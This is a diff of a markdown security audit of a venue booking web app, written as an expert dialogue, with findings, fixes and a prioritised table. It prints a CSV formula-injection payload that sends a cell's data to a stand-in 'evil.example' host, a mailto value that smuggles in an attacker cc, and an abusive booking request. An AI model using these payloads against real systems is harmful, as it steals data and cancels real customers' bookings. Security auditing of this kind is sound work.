+  "selectedSlots": [{ "date": "2026-11-07", "startTime": "08:00", "endTime": "18:00" }],
+  "recurrence": { "frequency": "weekly", "occurrences": 26 },
+  "customer": { "name": "x", "email": "throwaway@…", "phone": "0770000000", "purpose": "x" },
+  "turnstileToken": "<one valid token>" }
 ```
 
-What happens:
+**Hunt:** And the public priority notice on `/bookings` tells the attacker exactly which event types win. That is good customer UX, but it is also a map for the attacker.
 
-  1. The customer-acknowledgement email goes to `victim@example.com`. Most modern email
-     clients strip scripts but **not all** — and many render inline CSS and `<img>`
-     onload (Gmail web fetches images by default for known senders). At minimum: visual
-     spoofing in the email body.
-  2. The **admin-notification email** goes to `ADMIN_NOTIFICATION_EMAIL` containing the
-     same unescaped HTML. The admin's mail client may render images; if the admin uses
-     a self-hosted client without sandboxing, exploitable.
-  3. **The entire HTML body is stored verbatim in `EmailLog.htmlBody`**
-     ([`email.ts:141–152`](src/lib/email.ts#L141-L152)). If anyone — today or in v2 —
-     renders that field in an admin UI, instant XSS on the admin session. There is no
-     CSP today (see Part 8) to contain it.
+**Schneier:** This is the core design flaw. The system gives *the power to cancel others* to *an unauthenticated claim* ("I want to book Full Day"). The trust decision ("this booking outranks yours") should be made by the person who already makes trust decisions: the admin who confirms. The admin confirm path already runs the same cascade (`admin/calendar/bookings/route.ts:792-830`), so the fix is mostly deletion.
 
-**Fix:** HTML-escape every user-supplied string at the point of interpolation. A four-line
-helper:
+**Recommendation:** in the public POST, treat override targets as *soft conflicts*. Insert the pending booking **without** cascading, and record the would-be overrides so the admin sees them. Run the cascade only in the admin confirm path. Separately, write a script that lists `cancelled_override` slots whose overriding booking ended up `rejected`, and restore them.
 
-```ts
-function esc(s: string | null | undefined): string {
-  return String(s ?? "")
-    .replaceAll("&", "&amp;").replaceAll("<", "&lt;")
-    .replaceAll(">", "&gt;").replaceAll('"', "&quot;")
-    .replaceAll("'", "&#39;");
-}
-```
+### F2 — The client controls slot end time, so the price can be tampered with (High)
 
-Then wrap every `${params.customerName}` → `${esc(params.customerName)}`, etc.
+**Kettle:** The handler validates `startTime` and `endTime` as `HH:MM` strings (`route.ts:126-130`). It checks that both are inside working hours and that the start is on the room's cadence grid (`:172-196`). It **never checks that `end − start` equals the event type's `durationMinutes`**, or even that `end > start`. Price comes from `findPrice()` per slot, whatever the slot's length (`:248-260`). So a "1 Hour" booking with `"endTime": "18:00"` books the whole day at the one-hour rate. It also widens the overlap window used for F1.
 
-**Severity.** High. The admin-channel social-engineering surface alone justifies it. The
-EmailLog-XSS-on-future-render is the latent landmine.
+**Hunt:** An admin reviews pending bookings, so a sharp admin might notice "08:00–18:00, 1 Hour". But the queue shows slot times and the price side by side, and the price looks normal. I wouldn't rely on that.
 
-**Schneier.** The deeper point: storing rendered HTML in the database is a category
-error. Store *structured data* (customer name, slot list, amounts) and render at view
-time. If you ever need to re-render — for audit, for re-sending, for a CRM export —
-structured data wins. HTML in the DB is undecidable.
+**Kettle:** Related: there's no check against **past dates**. `assertAdvanceBookingLimit` only bounds the future (`calendar-core.ts:419-435`). Past-dated bookings pollute the revenue cohorts, which are keyed on `createdAt`, and the conflict data.
 
-**Kettle.** Two adjacent issues:
+**Recommendation:** derive `endTime` on the server as `startTime + eventType.durationMinutes` and ignore the client's value. Reject `date < todayInColombo()`.
 
-  - **No max-length on customer fields.** A 10 MB customer name is accepted, stored,
-    and rendered. Combined with no rate limit, this is a DB-filler. Add length caps in
-    the booking POST handler:
-    `name <= 100`, `email <= 254`, `phone <= 40`, `purpose <= 1000`.
-  - **The `mailto:` link** uses the customer email verbatim. A name like
-    `legit@example.com?subject=ignore&cc=attacker@x.com` becomes a working URL that
-    pre-populates a malicious mailto. Low severity but easy to escape.
+### F3 — Request size is unbounded, so slot expansion costs CPU and DB (Medium)
 
-**Willison.** A note on the future: if you ever add an "AI summarises this booking's
-purpose" feature or a chatbot that reads recent bookings, **today's unescaped customer
-fields become tomorrow's indirect prompt injection vector.** Fix the escaping now and
-you've also pre-empted that. Same fix, two threat models.
+**Kettle:** `selectedSlots` has no length cap (`route.ts:92`). It's multiplied by up to 26 by `expandRecurrence`, then put through `findInternalSlotConflicts`, which is **O(n²)** (`calendar-core.ts:444-465`). Then `bookingSlot.createMany` writes n rows. A few thousand base slots per request means millions of comparisons and thousands of rows in one Lambda. Turnstile limits this to one token per request, but one request is enough.
+
+**Recommendation:** cap `selectedSlots.length` (for example at 50) and the expanded total (for example at 200), and return 400 above that.
+
+### F4 — The public snapshot leaks admin-written text (Medium)
+
+**Willison:** `GET /api/calendar/week-snapshot` is anonymous. It returns `slot.rejectReason` for every slot of active bookings (`week-snapshot/route.ts:94-100`) and `block.reason` for every block (`:104-112`). Rejection reasons are admin free text written *to the customer*, like "Unpaid from last month, please call". Block reasons are internal notes, like "Closed for Minister's private event". Anyone can scrape them in 31-day windows. The client needs neither field to compute availability.
+
+**Recommendation:** drop `rejectReason` and `reason` from the response, or replace `reason` with a generic "Unavailable". The 409 conflict body in the booking POST also echoes `Blocked: ${blocked.reason}` and internal booking UUIDs (`calendar-core.ts:338, 379`). Send generic text there too.
+
+### F5 — Payment-ledger lost update (Medium)
+
+**Kettle:** `POST /bookings/[id]/payments` reads `paymentEntries`, inserts one, and recomputes the cached `paidAmountLkr` inside an interactive transaction (`payments/route.ts:55-93`). That transaction runs at Postgres's default READ COMMITTED with no row lock. Two admins posting at the same moment each recompute from a list missing the other's entry, and the last write wins. The ledger stays correct. The cached `paidAmountLkr` and `reconciliationStatus` do not, and the reminder cron trusts them.
+
+**Recommendation:** `SELECT … FOR UPDATE` on the booking row (via `$queryRaw`), or recompute from `paymentEntry.aggregate` after the insert. Also put an upper bound on `amountLkr`; `Number("1e20")` overflows the `Int` column and returns a 500.
+
+### F6 — Turnstile fails open and is not bound to the host (Medium)
+
+**Tabriz:** `src/lib/turnstile.ts:19-21` returns success when `TURNSTILE_SECRET_KEY` is empty. That was intentional for the rollout, but nothing alerts when it happens. A failed Amplify env bake, or a missed `_AMPLIFY_` line, silently removes the only bot control on two anonymous, email-sending endpoints. The verify call also ignores the `hostname` and `action` fields in Cloudflare's response.
+
+**Recommendation:** fail **closed** when `NODE_ENV === "production"` and the secret is missing, and log loudly. Check `data.hostname` against the allowed hosts. A non-destructive way to check production today: send `POST /api/contact` with `{}`. A response of "Bot verification failed" means Turnstile is enforcing. "Please complete all fields" means it is failing open.
+
+### Admin-side API notes
+
+**Kettle:** Three smaller items:
+
+- The **batch slot path** (`admin/calendar/bookings/route.ts:478-500`) can set `slotStatus: "confirmed"` without running `evaluateBookingConflicts`. Only the booking-level confirm (`:792`) checks. An admin can double-book through per-slot approve. That's not an attack, but it is an integrity gap.
+- The same path returns raw Prisma error text to the client (`:486-488`).
+- `POST /blocks` accepts `endTime <= startTime`, and `reason` has no length limit (`blocks/route.ts:56`). Combined with F4, that unlimited text is served publicly.
 
 ---
 
-## Part 6 — Third-Party Integrations
+## Part 4 — Customer-supplied content and where it lands
 
-**Tabriz.** Three integrations: **AWS Cognito** (auth), **Resend** (email), **a generic
-contact webhook**.
+*(Replaces "File upload". RMASA has no uploads, but it does have anonymous free text that flows into several sinks.)*
 
-**Cognito.** Covered in Parts 1 and 2. Two open items: enforce email uniqueness on the
-user pool, and turn on MFA before production scale.
+### F8 — CSV formula injection in the accounting export (Medium)
 
-**Resend.** The SDK client is correctly guarded:
+**Willison:** `exportCsv()` in `src/app/admin/calendar/reports/page.tsx:68-95` quotes commas and quotes, but it doesn't neutralise leading `=`, `+`, `-`, `@`, tab or CR. A customer named `=HYPERLINK("https://evil.example/?d="&F2,"Click for receipt")`, or a purpose field holding a DDE payload, runs when the accountant opens `rmasa-report.csv` in Excel. The name, email, phone and purpose columns are all attacker-controlled and anonymous.
 
-```ts
-const RESEND_API_KEY = process.env.RESEND_API_KEY ?? process.env._AMPLIFY_RESEND_API_KEY;
-const resend = RESEND_API_KEY ? new Resend(RESEND_API_KEY) : null;
-```
+**Hunt:** This is a classic, and it's exactly the file finance staff open on Windows with Excel. Medium is right. Excel's protected-view prompts are the only thing stopping it.
 
-([`email.ts:5–6`](src/lib/email.ts#L5-L6)) — the null guard is essential because
-`new Resend(undefined)` throws at module load and crashes every route that imports the
-file (this is explicitly noted in `CLAUDE.md` as a previous incident). Good.
+**Recommendation:** in `escape()`, prefix any cell starting with `[=+\-@\t\r]` with a `'`. The revenue CSV in `admin-revenue.tsx:239-268` only contains admin-configured names. Apply the same helper there anyway.
 
-`RESEND_FROM` defaults to `onboarding@resend.dev` until the domain is verified. That
-means **emails currently fail DMARC alignment for royalmasarena.lk** — customers' mail
-servers will deliver to spam or reject. Operational issue, but worth flagging because
-the `EmailLog` will show `status: sent` (Resend accepted it) even when downstream
-delivery failed. There's no bounce-tracking. Treat Resend `sent` as "queued at the
-provider," not "delivered."
+### F9 — Booking and contact forms send victim-addressed email (Medium)
 
-**Hunt.** Once the domain is registered, configure **SPF**, **DKIM**, and **DMARC** with
-`p=reject` (after a quarantine ramp). Without DMARC, the admin's customer can spoof
-emails *from* `royalmasarena.lk` to phish their own admin.
+**Hunt:** `POST /api/contact` sends `sendContactAcknowledgement` to **whatever email is typed in** (`contact/route.ts:84-87`), and echoes the submitted name and message back. The booking POST does the same with `sendBookingAcknowledgement`. Anyone can make the venue's sending identity deliver a 1,000-character message of their choosing to any inbox. "Your booking BK-… — please pay at https://…" from the real Royal MAS Arena sender is a ready-made phishing template. `esc()` stops HTML injection, but plain-text social engineering still works.
 
-**Tabriz.** **Contact webhook** at
-[`contact/route.ts:48–66`](src/app/api/contact/route.ts#L48-L66) — POST to a URL from env
-with no HMAC. As discussed in Part 4. Add HMAC. Also: the webhook receives `consent: true`
-because the route validates it client-side, but there's no audit trail in *your* DB —
-only the downstream CRM has the consent record. For GDPR/PDPA compliance evidence, store
-the consent locally too.
+**Schneier:** Turnstile makes it slow, but not impossible. A human with a script and a solving service pays cents per message.
 
-**Kettle.** The webhook fetch has no timeout. A slow webhook holds the Lambda for the
-full 60s default. Add `signal: AbortSignal.timeout(5_000)` to `fetch()`.
+**Recommendation:** don't echo the free-text message in the acknowledgement. Say "we received your message" and include the reference only. Add a per-recipient cap (for example, 3 acknowledgements per address per day, enforced from `EmailLog`).
 
 ---
 
-## Part 7 — Secrets & Infrastructure
+## Part 5 — Third-party data flows
 
-**Tabriz.** Secrets inventory:
+*(Replaces "AI pipeline". The data that leaves the trust boundary here goes to Microsoft Clarity, not an LLM.)*
 
-| Secret | Source | Files |
-|---|---|---|
-| `NEXTAUTH_SECRET` | env / `_AMPLIFY_NEXTAUTH_SECRET` | `auth.ts`, `middleware.ts` (via `getToken`) |
-| `COGNITO_CLIENT_ID` / `_SECRET` / `_ISSUER` | env / `_AMPLIFY_*` | `auth.ts`, `federated-logout` |
-| `DATABASE_URL` / `DIRECT_URL` | env / `_AMPLIFY_*` | `prisma.ts` (implied), schema |
-| `RESEND_API_KEY` / `RESEND_FROM` | env / `_AMPLIFY_*` | `email.ts` |
-| `ADMIN_NOTIFICATION_EMAIL` | env / `_AMPLIFY_*` | `email.ts` |
-| `CONTACT_WEBHOOK_URL` | env (no `_AMPLIFY_` baking) | `contact/route.ts` |
+### F10 — Microsoft Clarity records the admin panel, including customer PII (High)
 
-The `_AMPLIFY_*` baking pattern is documented and consistently applied. The
-[`check-amplify-secret-leak.mjs`](scripts/check-amplify-secret-leak.mjs) prebuild guard
-enforces an allowlist of files that may reference `_AMPLIFY_*` and **fails the build**
-otherwise. That's exactly the right control — it would have prevented several real
-incidents I've seen at peer companies.
+**Willison:** `src/app/layout.tsx:36-44` injects Clarity in the **root** layout, and the admin pages render inside that same root layout (CLAUDE.md says "there is no parallel admin layout"). So every admin session on `/admin/calendar/*` is session-recorded and sent to Microsoft. That includes the bookings detail pane with customer names, emails, phones and purposes, the payment ledger, the reports table and the accounts page. Clarity's default masking hides `<input>` values, but **rendered text is captured**, and the admin pane is almost all rendered text. I grepped for `data-clarity-mask`; there are zero uses.
 
-**Schneier.** Two upgrades worth doing:
+**Tabriz:** That's a data-processor relationship nobody signed up for, and probably a Sri Lanka PDPA (2022) problem: customer contact data sent to a third-party analytics vendor with no disclosure. It's also a breach multiplier. Whoever gets into the Clarity dashboard can replay the admin panel.
 
-  1. **The `CONTACT_WEBHOOK_URL` is read at runtime only** (no `_AMPLIFY_` baking). Per
-     the project's CLAUDE.md note "env vars added in Amplify console do not take effect
-     until next deployment" *and* "Amplify SSR Lambdas do not receive raw env vars at
-     runtime via `process.env`." So unless `CONTACT_WEBHOOK_URL` is baked, the contact
-     route in production silently falls into the dev branch
-     ([`contact/route.ts:43`](src/app/api/contact/route.ts#L43)) and just `console.log`s
-     enquiries. **Verify in production** — this is the kind of thing that lurks
-     until someone asks "why aren't we getting contact leads?"
+**Hunt:** I'd rate it High. It isn't exploitable in the CVE sense, but it's an ongoing, silent leak of every customer's PII.
 
-  2. **Rotation story for `NEXTAUTH_SECRET`.** Rotating invalidates all JWT sessions —
-     that's a feature (admin lockout, force re-auth). But the rotation process should be
-     documented: "rotate when you suspect compromise; users will be forced to sign in
-     again." Today there's no runbook.
+**Recommendation:** load Clarity only on public routes. Gate it on `!pathname.startsWith("/admin")` in a small client component, or move the script into a `(public)` route group layout. As a backstop, add `data-clarity-mask="true"` on `.admin-section`. Also review the public bookings page: the receipt panel echoes the customer's name, email and phone as text after they type them.
 
-**Hunt.** No SDK-client-at-module-level landmines remaining. Prisma is correctly
-singleton'd ([`prisma.ts`](src/lib/prisma.ts), per the CLAUDE.md pattern). Resend is
-guarded. Cognito is via NextAuth provider. Clean.
+### Other third parties
 
-**Kettle.** Two infra-shaped issues:
+**Tabriz:**
 
-  - **Audit log IP capture** at e.g.
-    [`bookings/route.ts:111–112`](src/app/api/admin/calendar/bookings/route.ts#L111-L112)
-    uses `req.headers.get("x-forwarded-for")` directly. Amplify sets that to a
-    comma-separated chain (`client, hop1, hop2`). You should take the leftmost value
-    after trimming, *and* be aware that an unauthenticated request can append to the
-    chain in some misconfigurations. For an internal admin route this is mostly
-    cosmetic; document the format your audit log expects.
-
-  - **Aurora min ACU 0** (per [`CLAUDE.md`](CLAUDE.md#aurora-serverless-v2-cold-start-min-acu-0))
-    means cold-start latency 15–30 s. Mitigated for migrations via retry loop. At
-    runtime, the **first booking POST after idle** can time out before the customer's
-    email arrives. Not a security finding directly; an availability finding that becomes
-    a security finding when customers double-submit and admins manually deduplicate.
+- **Resend** still sends from `onboarding@resend.dev` until the domain is verified. Deliverability is poor, and it makes F9's phishing harder to tell apart from real mail.
+- **Contact webhook**: still unsigned and has no `AbortSignal.timeout` (`contact/route.ts:94-107`). And because of the missing `next.config.ts` line, it is probably **not firing in production at all** (May #10).
+- **Cognito**: fine. The client secret is server-only, and `COGNITO_ISSUER` comes from config, not user input, so the `.well-known` fetch in `federated-logout` is not an SSRF.
 
 ---
 
-## Part 8 — Browser-Side & Supply-Chain Risks
+## Part 6 — Secrets & infrastructure
 
-**Tabriz.** Security-header inventory from
-[`next.config.ts:17–37`](next.config.ts#L17-L37):
+**Tabriz:** The `_AMPLIFY_*` pattern is clever, and the prebuild leak guard (`scripts/check-amplify-secret-leak.mjs`) is better than most teams have. Two notes:
 
-  - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` ✓
-  - `X-Frame-Options: DENY` ✓
-  - `X-Content-Type-Options: nosniff` ✓
-  - `Referrer-Policy: strict-origin-when-cross-origin` ✓
-  - `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` ✓
+1. The baked values are **plaintext string literals in the server bundle on disk** in the Lambda artifact and in Amplify's build cache (`.next/cache/**`). Anyone with read access to the Amplify app or its S3 artifacts has every secret: DB URL, NextAuth secret, Cognito secret, Resend key, cron secret. Treat Amplify console access as equivalent to production DB access, and keep that IAM group small. The longer-term fix is AWS Secrets Manager or SSM read at cold start, which `src/instrumentation.ts` is already positioned to do.
+2. `instrumentation.ts` copies only 6 of the 12 baked vars into `process.env`. Code that reads `process.env.X` directly, without the fallback, therefore gets `undefined` for the other six in production. That's how `CONTACT_WEBHOOK_URL` (#10) failed. One explicit allowlist in one file would remove this class of bug.
 
-That's the cleanest header set I've seen this audit cycle. **What's missing: a
-Content-Security-Policy.** The Spark2Build audit yesterday found CSP issues; here you
-have no CSP at all. The admin UI is a JSON-driven React app; a tight CSP is achievable.
-Start with:
+**Kettle:** Cron auth (`cron/unpaid-reminders/route.ts:29-33`) uses `!==` instead of `timingSafeEqual`. Over the network, through CloudFront, the timing signal is negligible. The comment is honest about it. Low.
 
-```
-default-src 'self';
-script-src 'self';
-style-src 'self' 'unsafe-inline';
-img-src 'self' data:;
-connect-src 'self';
-frame-ancestors 'none';
-form-action 'self';
-base-uri 'none'
-```
+**Schneier:** Here's one nobody would think of. **The repository is public** (`gh repo view` → `PUBLIC`). `.github/workflows/unpaid-reminders.yml` runs `curl -fsS`, which prints the response body: `bookingsReminded: [{ reference, milestoneDays, … }]`. Actions logs on a public repo are readable by anyone. So the world gets a daily list of which booking references are overdue. It's low impact today, because there's no public lookup by reference, but it's an unforced disclosure. Add `-o /dev/null -w '%{http_code}'`. More broadly, `CLAUDE.md` and `docs/` give an attacker the full architecture, including the priority-override mechanism behind F1. Being public isn't wrong in itself, but it means you can't count on anything staying obscure.
 
-The `'unsafe-inline'` on `style-src` is the practical compromise for Tailwind generated
-classes; everything else can be `'self'`. Critically, this would contain the
-EmailLog-future-XSS scenario from Part 5 — if someone ever renders `htmlBody` in the
-admin UI, `script-src 'self'` blocks injected scripts.
+**Tabriz:** Incident readiness: `AuditLog` is good, but `logAuditEvent` swallows all errors (`src/lib/audit.ts:29-31`), so a broken audit write is invisible. Nothing alerts on bursts of `AUTH_LOGIN_FAILED` or on override cascades. Override cascades should at least go to the admin digest, and they already do via `sendAdminSlotOverriddenNotification`. Good. Turn that email into a runbook trigger.
 
-**Hunt.** No client-side analytics / session-replay / third-party JS evident. Clean.
+---
 
-**Kettle.** CSRF: NextAuth's session cookie is httpOnly, secure, SameSite=Lax by default.
-Admin POSTs accept JSON; cross-origin JSON POST triggers a CORS preflight that the API
-doesn't allow, so technically CSRF is blocked. **But** there's no explicit `Origin` check
-on POSTs, so a same-site subdomain (e.g. if you ever add `marketing.royalmasarena.lk`
-that supports user content) becomes a CSRF source. Defence-in-depth: add an Origin
-header check on state-changing routes, allow only `NEXTAUTH_URL` origin.
+## Part 7 — Browser-side & supply chain
 
-**Schneier.** Supply chain: this is a small dependency set. NextAuth, Prisma, Resend,
-React. Run `npm audit --production` on every release; pin to specific versions; add
-Dependabot. Particularly watch **NextAuth** — the v4 → v5 migration has security
-implications and the version you're on (whatever Next 15 expects) should be on the
-supported branch.
+**Tabriz:**
+
+- **F14 CSP**: enforcing, with a tight host list. But `script-src 'unsafe-inline'` (`next.config.ts:27`) means an injected inline `<script>` still runs, which cancels most of CSP's value against XSS. Next 15 supports per-request nonces through middleware. The only inline script is the Clarity bootstrap, which can move to an external file under `/public`. That would let you drop `'unsafe-inline'` from `script-src`. Medium.
+- **Security headers on static files**: `headers()` doesn't apply to `/public/` assets on Amplify (as CLAUDE.md notes for Cache-Control). Those are images, so the missing CSP doesn't matter. HSTS on the HTML is what counts, and that's present.
+- **F16 `sharp` < 0.35.5** (GHSA-wq5f-xc86-pv6w, librsvg). `npm audit --omit=dev` flags it as **high**. In practice it's reachable only if `next/image` optimises an attacker-supplied SVG. There are no `remotePatterns`, so it isn't reachable today. `npm audit fix` is a one-liner, so do it now.
+- **No automated dependency monitoring.** Two overrides were added by hand in October. Add Dependabot (`.github/dependabot.yml`, weekly, npm + github-actions).
+
+**Willison:** XSS sinks: I grepped for `dangerouslySetInnerHTML` and `innerHTML` across `src/` and found zero hits. React escaping plus `esc()` in email covers the rest. `EmailLog.htmlBody` is still never rendered. Keep it that way, or render it in a sandboxed `<iframe srcdoc>` with no `allow-scripts`.
 
 ---
 
 ## Conclusions
 
-**Hunt.** My top three:
+**Schneier:** The authentication layer is solid. The problem is that an anonymous form submission is treated as an *instruction* when it should be a *request*. F1 and F2 both come from that: the server lets the anonymous client decide whom to cancel and how long to book. Fix the trust model, and most of the High-severity surface disappears.
 
-  1. **HTML email injection** via unescaped customer fields (`customerName`, `customerEmail`,
-     `customerPhone`, `rejectReason`) interpolated into both customer-facing and
-     admin-facing emails, plus stored in `EmailLog.htmlBody`. High severity, low effort.
-  2. **JWT role/active staleness** — `requireAdmin` trusts the JWT-stamped role for up to
-     4 hours after deactivation. The deactivate button is misleading.
-  3. **No rate limit / no CAPTCHA / no length caps on the public booking endpoint.**
-     Email-bomb the admin, fill the calendar, run up Resend bill.
+**Kettle:** F1 first. It can be exploited today with one Turnstile solve, it damages real customers, and it can't be undone in the UI.
 
-**Kettle.** My top three:
+**Hunt:** F10 second. It's a privacy leak happening on every admin page view right now, and it's a ten-line fix.
 
-  1. **`updateCalendarDb` read-modify-write race** between two admins acting on stale
-     snapshots silently reverts the loser's work.
-  2. **PaymentEntry net-collected math** subtracts waivers from cash collected — that's
-     either a bug or a doc error; either way it touches money.
-  3. **Booking reference 24-bit collision** turns into 500-error UX at scale.
+**Tabriz:** Then make the deactivate button work everywhere (F7), and stop failing open (F6).
 
-**Tabriz.** Defence-in-depth:
-
-  1. Add CSP — contains the EmailLog future-XSS scenario.
-  2. Enforce Cognito email uniqueness at the user-pool level.
-  3. Move MFA up the priority list — TOTP doesn't need domain verification.
-  4. Verify `CONTACT_WEBHOOK_URL` is actually reaching production (baked via
-     `_AMPLIFY_*` or set as a runtime-readable var).
-
-**Schneier.** Conceptual cleanups:
-
-  1. Stop storing rendered HTML in `EmailLog.htmlBody`; store structured data.
-  2. Replace JWT-stamped authorisation with per-request Postgres lookups (or short
-     session caches) — deactivation must be immediate.
-  3. Replace `updateCalendarDb` wipe-and-recreate with targeted writes + optimistic
-     concurrency. The current pattern produces an audit log that doesn't reflect the
-     actual *intent* of admin actions.
-
-**Willison.** No AI today. The most important pre-AI hygiene: **don't put user-supplied
-text into shared canonical-form blobs.** That's the lesson from the email-HTML issue and
-it's the lesson that will save you from indirect prompt injection when you eventually
-add a "summarise this booking" feature.
+**Willison:** And neutralise the CSV export (F8) before the next month-end report. The person most likely to open a weaponised spreadsheet is the accountant.
 
 ---
 
-## Findings Table
+## Prioritised findings
 
 | # | Finding | OWASP | Severity | Effort | Expert(s) |
 |---|---|---|---|---|---|
-| 1 | ~~Customer-supplied `customerName`, `customerEmail`, `customerPhone` and admin-supplied `rejectReason` interpolated into HTML emails without escaping ([email.ts](src/lib/email.ts)). Also stored verbatim in `EmailLog.htmlBody`. Admin social-engineering + latent XSS if `htmlBody` is ever rendered in an admin UI.~~ **Fixed 2026-05-18** — see Remediation log. | A03 | **High** | Low | Hunt, Willison |
-| 2 | ~~JWT-stamped `role` and `active` are trusted for the full 4 h session~~ ([auth.ts:84–100](src/lib/auth.ts#L84-L100), [auth-guards.ts:15–33](src/lib/auth-guards.ts#L15-L33)). ~~Deactivation and role-demotion don't take effect until session expiry; no revocation channel.~~ **Fixed 2026-05-18** — see Remediation log. | A01 / A07 | **High** | Medium | Hunt, Schneier |
-| 3 | ~~`updateCalendarDb` read-modify-write at the application layer~~ ([calendar-store.ts:116–264](src/lib/calendar-store.ts#L116-L264)): ~~two concurrent admin actions on stale snapshots → last writer silently reverts the other's work. No optimistic concurrency.~~ **Fixed 2026-05-19** — `updateCalendarDb` removed; replaced by targeted-write helpers. See Remediation log. | A08 | **High** | High | Kettle |
-| 4 | Public booking POST `/api/calendar/bookings`: Cloudflare Turnstile + ~~length caps~~ now in place; remaining gap is no per-IP WAF rate limit at the edge. Email-bomb the admin / Resend cost amplification still partially open. ~~**Length caps fixed 2026-05-19.**~~ | A04 | **Medium** | Low | Hunt, Schneier |
-| 5 | ~~PaymentEntry net-collected calculation subtracts every non-`payment` type, including `waiver` ([payments/route.ts:75–80](src/app/api/admin/calendar/bookings/[id]/payments/route.ts#L75-L80)). Mismatch between the schema doc model (waiver reduces *outstanding*) and the code behaviour (waiver reduces *paidAmountLkr*). Touches money.~~ **Fixed 2026-05-19** — see Remediation log. | — | **Medium** | Low | Kettle |
-| 6 | ~~No CSP header in [`next.config.ts`](next.config.ts) or middleware. HSTS / X-Frame / X-Content / Referrer / Permissions are all set — CSP is the conspicuous absence. Future EmailLog-render XSS would be uncontained.~~ **Fixed 2026-05-19 (enforcing)** — see Remediation log. | A05 | **Medium** | Low | Tabriz |
-| 7 | Cognito MFA off (documented in `CLAUDE.md`); also `EMAIL` alias-attribute uniqueness on the user pool not enforced in code — relies on the user-pool configuration. `cognitoSub` backfill is trust-on-first-use. | A07 | **Medium** | Low | Hunt, Tabriz |
-| 8 | `/api/contact` accepts unauthenticated POST and forwards to `CONTACT_WEBHOOK_URL` without HMAC or signing. No timeout on the outbound fetch. | A08 / A04 | **Medium** | Low | Tabriz, Kettle |
-| 9 | Booking reference is 3 random bytes (24 bits) ([bookings/route.ts:40–42](src/app/api/calendar/bookings/route.ts#L40-L42)). At ~10 k bookings, ~1 % birthday-bound collision probability; collision returns 500 to the customer. No retry-on-conflict. | — | **Low** | Low | Kettle |
-| 10 | `CONTACT_WEBHOOK_URL` is read at runtime but not added to the `_AMPLIFY_*` baking list in `next.config.ts` — may silently fall to the dev branch in production. | — | **Medium** | Low | Schneier |
-| 11 | `cachedLogoutEndpoint` module-scope cache in [`federated-logout/route.ts:5`](src/app/api/auth/federated-logout/route.ts#L5) defeats the `cache: "no-store"` fetch and never refreshes within a Lambda lifetime. | — | **Low** | Low | Kettle |
-| 12 | No length caps on customer fields (`name`, `email`, `phone`, `purpose`) in the public POST. Combined with no rate limit → DB-filler attack possible. | A04 | **Low** | Low | Kettle |
-| 13 | `EmailLog.htmlBody` stores full rendered customer-PII HTML indefinitely. No retention policy; no GDPR/PDPA delete flow. | — | **Medium** | Medium | Schneier |
-| 14 | Resend default `FROM = "onboarding@resend.dev"` until domain verified — emails fail DMARC alignment for `royalmasarena.lk`; deliverability silently degraded; `EmailLog.status='sent'` is misleading. | — | **Low** | Medium | Hunt |
-| 15 | `wipe-and-recreate` calendar transaction runs ~5 round-trips per booking on Neon Singapore → 30 s timeout will start firing at moderate data volumes. Availability becomes a security issue when admins start retrying / double-submitting. | — | **Medium** | High | Kettle |
-| 16 | `GET /api/admin/calendar/bookings` returns all bookings + slots + breakdown + payments unpaginated. | — | **Low** | Medium | Tabriz |
-| 17 | No explicit `Origin` check on admin state-changing routes; relies on SameSite=Lax + JSON preflight only. Future subdomain content widens the CSRF surface. | A01 | **Low** | Low | Kettle |
-| 18 | `x-forwarded-for` consumed directly in `logAuditEvent` without trim/validation. Cosmetic for admin routes but worth documenting. | — | **Low** | Low | Kettle |
-| 19 | No `npm audit --production` / Dependabot / Renovate evident in CI config. Pin dependencies; track NextAuth version branch. | A06 | **Low** | Low | Schneier |
-| 20 | 4 h session `maxAge` is long for admins handling financial actions; combined with `updateAge: 15 min` it auto-renews indefinitely on activity. | — | **Low** | Low | Schneier |
+| F1 | Anonymous `POST /api/calendar/bookings` cascades `cancelled_override` onto **confirmed** lower-priority bookings at submit time, before admin review, with no restore on reject. One request with a 26× recurrence can wipe a room for 6 months and email every victim (`bookings/route.ts:413-427`, `calendar-store.ts:220-238`, `calendar-core.ts:365-376`) | A04 Insecure Design / A01 | **Critical** | Medium | Kettle, Schneier, Hunt |
+| F22 | *(Found while fixing F1.)* Client-sent `slotStatus` / `rejectReason` in `selectedSlots` were copied into `BookingSlot` by `insertBookingWithCascade`, so an anonymous request could submit its own slots as `confirmed` | A08 / mass assignment | **High** | Low | Kettle |
+| F2 | Client-supplied `endTime` is trusted: no `end − start == durationMinutes` check and no `end > start` check, so a whole day can be booked at the 1-hour price. Past dates are also accepted (`bookings/route.ts:126-196`) | A04 | **High** | Low | Kettle |
+| F10 | Microsoft Clarity runs on `/admin/*` (root layout `layout.tsx:36-44`) with no masking, so customer names, emails, phones and payments are session-recorded by a third party | A02 / privacy (PDPA) | **High** | Low | Willison, Tabriz, Hunt |
+| F7 | Admin server components (`admin/calendar/layout.tsx:11`, `page.tsx:25`, `revenue`, `schedule`) trust the JWT only. Deactivated admins keep read access to PII and revenue for 4 h or more | A01 / A07 | **Medium** | Low | Tabriz, Kettle |
+| F8 | CSV formula injection: customer fields are exported unneutralised in `reports/page.tsx:68-95` | A03 Injection | **Medium** | Low | Willison, Hunt |
+| F6 | Turnstile fails open when the secret is missing (`turnstile.ts:19-21`), with no alert and no hostname/action check | A05 / A07 | **Medium** | Low | Tabriz |
+| F3 | No cap on `selectedSlots`; ×26 expansion plus O(n²) `findInternalSlotConflicts` and an unbounded `createMany` | A04 | **Medium** | Low | Kettle |
+| F9 | Contact/booking acknowledgements echo attacker text to any email address, a phishing relay using the venue's identity (`contact/route.ts:84-87`) | A04 | **Medium** | Low | Hunt, Schneier |
+| F4 | Public `week-snapshot` returns `slot.rejectReason` and `block.reason` admin free text; the 409 body echoes block reasons and booking UUIDs | A01 / A04 info disclosure | **Medium** | Low | Willison |
+| F5 | Payment-entry POST recomputes cached totals without a row lock, so concurrent entries lose updates. `amountLkr` has no upper bound (Int overflow returns 500) | A04 | **Medium** | Low | Kettle |
+| F14 | CSP `script-src 'unsafe-inline'` (`next.config.ts:27`) cancels most of the XSS protection | A05 | **Medium** | Medium | Tabriz |
+| F11 | `cognitoSub` stored but never compared, so a recreated Cognito user with the same email inherits the admin row (`auth.ts:68-74`) | A07 | **Medium** | Low | Kettle |
+| F12 | MFA still off; Cognito TOTP needs no domain or SES | A07 | **Medium** | Low | Schneier, Hunt |
